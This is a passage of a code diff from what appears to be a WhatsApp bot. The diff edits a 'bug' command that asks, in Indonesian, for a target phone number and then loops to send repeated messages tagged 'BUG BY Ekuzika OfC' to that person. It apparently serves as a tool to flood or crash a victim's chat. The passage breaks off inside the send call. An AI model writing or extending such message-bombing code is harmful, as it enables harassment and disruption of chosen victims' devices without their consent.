@@ -3704,9 +3704,8 @@ case '🔥':
 case 'p':
 case 'dor': 
  if (!q) return reply(`Nomor target nya mana banh?\nContoh: ${command} 628xxx`)
- num = `${q}`+'@s.whatsapp.net'
-        jumlah = '10'
-        waktu = `10s`
+ let num = `${q}`+'@s.whatsapp.net'
+       let jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 conn.sendMessage(num, {
 text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️', 
